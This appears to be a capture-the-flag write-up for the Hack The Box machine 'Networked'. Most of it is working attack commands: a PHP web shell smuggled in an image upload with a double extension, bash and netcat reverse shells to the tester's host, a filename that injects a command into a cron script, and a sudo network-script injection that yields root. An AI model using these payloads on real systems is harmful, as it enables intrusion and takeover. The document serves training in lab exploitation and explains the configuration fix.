---
permalink: /posts/HTB/Networked
title:  "HTB Networked"
author: Luc Kolen
description: "Networked is an easy Linux machine on HTB"
categories:
  - CTF
  - HTB
tags:
  - HTB-Easy
  - Linux
  - Gobuster
  - Crontab
---
# 10.10.10.146 - Networked

|Hack The Box|Created by|Points|
|---|---|---|
|[Link](https://www.hackthebox.eu/home/machines/profile/203)|[guly](https://www.hackthebox.eu/home/users/profile/8292)|20|

- [10.10.10.146 - Networked](#101010146---networked)
  - [Open ports](#open-ports)
  - [HTTP](#http)
  - [Privilege escalation](#privilege-escalation)
    - [Apache -> Guly](#apache---guly)
    - [Guly -> root](#guly---root)
  - [TL;DR](#tldr)
  - [Bonus](#bonus)
    - [Why did the code in our image execute](#why-did-the-code-in-our-image-execute)

## Open ports

```bash
luc@kali:~/HTB/Networked$ nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.146
```

|Port|Service|Version
|---|---|---|
22/tcp|ssh|OpenSSH 7.4 (protocol 2.0)
80/tcp|http|Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)

## HTTP

Browsing to `http://10.10.10.146/` shows some text without any links or forms.

```bash
luc@kali:~/HTB/Networked$ gobuster dir -u http://10.10.10.146/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp"
...
/index.php (Status: 200)
/uploads (Status: 301)
/photos.php (Status: 200)
/upload.php (Status: 200)
/lib.php (Status: 200)
/backup (Status: 301)
```

Gobuster shows a `/backup` directory, browsing there shows one file, `backup.tar`.

```bash
luc@kali:~/HTB/Networked$ wget http://10.10.10.146/backup/backup.tar
luc@kali:~/HTB/Networked$ mkdir backup
luc@kali:~/HTB/Networked$ mv backup.tar backup
luc@kali:~/HTB/Networked$ cd backup/
luc@kali:~/HTB/Networked/backup$ 7z e backup.tar
...
Files: 4
luc@kali:~/HTB/Networked/backup$ ls
backup.tar  index.php  lib.php  photos.php  upload.php
```

The contents of `backup.tar` match the other files found by Gobuster so we've access to the source code of the website.

```php
# Upload.php
<?php
require '/var/www/html/lib.php';

define("UPLOAD_DIR", "/var/www/html/uploads/");

if( isset($_POST['submit']) ) {
  if (!empty($_FILES["myFile"])) {
    $myFile = $_FILES["myFile"];

    if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
      echo '<pre>Invalid image file.</pre>';
      displayform();
    }

    if ($myFile["error"] !== UPLOAD_ERR_OK) {
        echo "<p>An error occurred.</p>";
        displayform();
        exit;
    }

    //$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];
    list ($foo,$ext) = getnameUpload($myFile["name"]);
    $validext = array('.jpg', '.png', '.gif', '.jpeg');
    $valid = false;
    foreach ($validext as $vext) {
      if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
        $valid = true;
      }
    }

    if (!($valid)) {
      echo "<p>Invalid image file</p>";
      displayform();
      exit;
    }
    $name = str_replace('.','_',$_SERVER['REMOTE_ADDR']).'.'.$ext;

    $success = move_uploaded_file($myFile["tmp_name"], UPLOAD_DIR . $name);
    if (!$success) {
        echo "<p>Unable to save file.</p>";
        exit;
    }
    echo "<p>file uploaded, refresh gallery</p>";

    // set proper permissions on the new file
    chmod(UPLOAD_DIR . $name, 0644);
  }
} else {
  displayform();
}
?>
```

```php
# Lib.php
<?php

function getnameCheck($filename) {
  $pieces = explode('.',$filename);
  $name= array_shift($pieces);
  $name = str_replace('_','.',$name);
  $ext = implode('.',$pieces);
  #echo "name $name - ext $ext\n";
  return array($name,$ext);
}

function getnameUpload($filename) {
  $pieces = explode('.',$filename);
  $name= array_shift($pieces);
  $name = str_replace('_','.',$name);
  $ext = implode('.',$pieces);
  return array($name,$ext);
}

function check_ip($prefix,$filename) {
  //echo "prefix: $prefix - fname: $filename<br>\n";
  $ret = true;
  if (!(filter_var($prefix, FILTER_VALIDATE_IP))) {
    $ret = false;
    $msg = "4tt4ck on file ".$filename.": prefix is not a valid ip ";
  } else {
    $msg = $filename;
  }
  return array($ret,$msg);
}

function file_mime_type($file) {
  $regexp = '/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/';
  if (function_exists('finfo_file')) {
    $finfo = finfo_open(FILEINFO_MIME);
    if (is_resource($finfo)) // It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system
    {
      $mime = @finfo_file($finfo, $file['tmp_name']);
      finfo_close($finfo);
      if (is_string($mime) && preg_match($regexp, $mime, $matches)) {
        $file_type = $matches[1];
        return $file_type;
      }
    }
  }
  if (function_exists('mime_content_type'))
  {
    $file_type = @mime_content_type($file['tmp_name']);
    if (strlen($file_type) > 0) // It's possible that mime_content_type() returns FALSE or an empty string
    {
      return $file_type;
    }
  }
  return $file['type'];
}

function check_file_type($file) {
  $mime_type = file_mime_type($file);
  if (strpos($mime_type, 'image/') === 0) {
      return true;
  } else {
      return false;
  }  
}

function displayform() {
?>
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" enctype="multipart/form-data">
 <input type="file" name="myFile">
 <br>
<input type="submit" name="submit" value="go!">
</form>
<?php
  exit();
}
?>
```

`upload.php` shows the checks that are done on an uploaded file before it's saved on the server in the `/var/www/html/uploads/` directory. These checks are implemented in `lib.php` and there isn't an obvious bypass to these checks.

```http
POST /upload.php HTTP/1.1
Host: 10.10.10.146

------WebKitFormBoundarySdwBRRRQongZsCg5
Content-Disposition: form-data; name="myFile"; filename="logo.jpg"
Content-Type: image/jpeg

...
------WebKitFormBoundarySdwBRRRQongZsCg5
Content-Disposition: form-data; name="submit"

go!
------WebKitFormBoundarySdwBRRRQongZsCg5--
```

```http
HTTP/1.1 200 OK
Date: Sat, 27 Jun 2020 09:48:15 GMT
Server: Apache/2.4.6 (CentOS) PHP/5.4.16
X-Powered-By: PHP/5.4.16
Content-Length: 37
Connection: close
Content-Type: text/html; charset=UTF-8

<p>file uploaded, refresh gallery</p>
```

Uploading an image is successful and browsing to `http://10.10.10.146/photos.php` we can see that our image is added.

![image.php.jpg](/assets/images/HTB-Networked/1.a%20image.php.jpg.png)

Changing the filename from `logo.php` to `logo.php.jpg` also successfully uploads our file and both show on `http://10.10.10.146/photos.php`. The difference is that browsing to `http://10.10.10.146/uploads/10_10_14_9.jpg` shows the image as we expected but `http://10.10.10.146/uploads/10_10_14_9.php.jpg` shows something unexpected. We see the image data, but not as an image.

```bash
luc@kali:~/HTB/Networked$ cp logo.jpg logo.php.jpg
luc@kali:~/HTB/Networked$ echo '<?php phpinfo(); ?>' >> logo.php.jpg
```

Going to `http://10.10.10.146/uploads/10_10_14_9.php.jpg` will show us the image data followed by the output of `phpinfo()`. This confirms that we've code execution.

```bash
luc@kali:~/HTB/Networked$ cp logo.jpg logo.php.jpg
luc@kali:~/HTB/Networked$ echo '<?php system($_REQUEST["cmd"]); ?>' >> logo.php.jpg
```

```http
GET /uploads/10_10_14_9.php.jpg?cmd=whoami HTTP/1.1
Host: 10.10.10.146

...
apache
```

Our simple command shell is working and we can see that we're running as user `apache`.

```http
GET /uploads/10_10_14_9.php.jpg?cmd=bash+-i+>%26+/dev/tcp/10.10.14.9/443+0>%261 HTTP/1.1
Host: 10.10.10.146
```

```bash
luc@kali:~/HTB/Networked$ sudo nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.146.
Ncat: Connection from 10.10.10.146:49104.
bash: no job control in this shell
bash-4.2$ id
uid=48(apache) gid=48(apache) groups=48(apache)
```

## Privilege escalation

### Apache -> Guly

```bash
bash-4.2$ cat /home/guly/user.txt
cat: /home/guly/user.txt: Permission denied
```

User `apache` doesn't have access to read `user.txt`

```bash
bash-4.2$ cd /home/guly/
bash-4.2$ ls -R
.:
check_attack.php  crontab.guly  user.txt
bash-4.2$ cat check_attack.php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
bash-4.2$ cat crontab.guly
*/3 * * * * php /home/guly/check_attack.php
bash-4.2$ ls -l
total 12
-r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php
-rw-r--r--  1 root root  44 Oct 30  2018 crontab.guly
-r--------. 1 guly guly  33 Oct 30  2018 user.txt
```

`apache` does have the ability to read `check_attack.php` and `crontab.guly` in `/home/guly`. We don't have the ability to write to the file so can't place a shell directly in it.

`exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");` could be interesting, we control `$value` because it's the filename of a file we place in `/var/www/html/uploads/`.

```bash
bash-4.2$ which nc
/usr/bin/nc
bash-4.2$ touch '/var/www/html/uploads/; nc 10.10.14.9 444 -c bash'
bash-4.2$ ls /var/www/html/uploads
10_10_14_9.jpg  10_10_14_9.php.jpg  127_0_0_1.png  127_0_0_2.png  127_0_0_3.png  127_0_0_4.png  ; nc 10.10.14.9 444 -c bash  index.html
```

```bash
luc@kali:~/HTB/Networked$ sudo nc -lnvp 444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::444
Ncat: Listening on 0.0.0.0:444
Ncat: Connection from 10.10.10.146.
Ncat: Connection from 10.10.10.146:43288.
id
uid=1000(guly) gid=1000(guly) groups=1000(guly)
cat /home/guly/user.txt
526cfc23************************
```

We need to wait a bit of time because this cron is only executed every 3 minutes.

### Guly -> root

```bash
[guly@networked ~]$ sudo -l
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
[guly@networked ~]$ cat /usr/local/sbin/changename.sh
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
```

`Guly` can execute `/usr/local/sbin/changename.sh` as `root` without a password. We see that this script will try to add a new network device named guly0.

```bash
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
interface NAME:
x bash
interface PROXY_METHOD:
x
interface BROWSER_ONLY:
x
interface BOOTPROTO:
x
[root@networked network-scripts]# id
uid=0(root) gid=0(root) groups=0(root)
[root@networked network-scripts]# cat /root/root.txt
0a8ecda8************************
```

Looking at `/etc/sysconfig/network-scripts/ifcfg-guly` we can see `NAME=test bash`. This variable is read and instead of having `test bash` as the value bash will be executed. We're running the script as `root` so we get `bash` running as `root`.

## TL;DR

- Upload image with PHP code
- User has a script in crontab that we can abuse
- User can run script as root

## Bonus

### Why did the code in our image execute

```bash
[root@networked network-scripts]# cd /etc/httpd/conf.d
[root@networked conf.d]# cat php.conf
AddHandler php5-script .php
AddType text/html .php
DirectoryIndex index.php
php_value session.save_handler "files"
php_value session.save_path    "/var/lib/php/session"
```

`AddHandler php5-script .php` is the important part, this makes sure all files with `.php` in the filename will be executed as PHP code.

```text
<FilesMatch ".php$">
    AddHandler php5-script .php
    AddType text/html .php
</FilesMatch>
DirectoryIndex index.php
php_value session.save_handler "files"
php_value session.save_path    "/var/lib/php/session"
```

This would've fixed the `php.conf` file because it filters for files ending in `.php`.
